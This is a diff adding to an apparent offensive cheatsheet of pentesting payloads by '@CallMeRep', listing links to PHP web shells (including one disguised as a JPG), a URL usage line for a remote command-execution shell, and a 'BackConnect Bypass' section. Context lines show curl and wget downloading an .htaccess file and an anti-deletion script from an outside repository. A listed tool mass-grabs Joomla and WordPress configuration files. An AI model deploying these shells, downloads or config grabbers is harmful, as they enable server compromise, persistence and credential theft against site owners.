@@ -1,3 +1,17 @@
+# Cheatsheet Pentesting & Payloads By [@CallMeRep](https://t.me//CallMeRep)
+
+## Summary
+* [Tools](#tools)
+* [Shell Backdoor Bypass](#looting-for-passwords)
+    * [Alfa Shells](https://github.com/t101804/repshare/blob/main/alfa.php)
+    * [Evil Twin Shells](https://github.com/t101804/repshare/blob/main/eviltwin.php)
+    * [Gecko Shells](https://github.com/t101804/repshare/blob/main/gk.php)
+    * [Gecko JPG Shells](https://github.com/t101804/repshare/blob/main/gkjpg.jpg)
+    * [Open Source Shells By Anon7](https://github.com/t101804/repshare/blob/main/ac.php)
+    * [Commander RCE Shell Bypass](https://github.com/t101804/repshare/blob/main/commander.php) 
+    ```
+    commander.php?command=[executeurcommand] then the response you can access in /output_command.txt
+    ```
 # Trick BackConnect Bypass
 ## Python 
 ```
@@ -26,6 +40,9 @@ curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/t
 ```
 wget https://raw.githubusercontent.com/t101804/repshare/main/priv8_anti_delet.sh
 ```
-
+## Tools
+- [reverse-shell-generator](https://www.revshells.com/)
+- [mass-grab-config-joomla&wp-vhost-symlink](https://github.com/t101804/repshare/blob/main/mass_vghost_config_grab.py)
+- [linux_privilage_check_that_i_use](https://github.com/sleventyeleven/linuxprivchecker)
 
 Credit by revshells.com and @CallMeRep
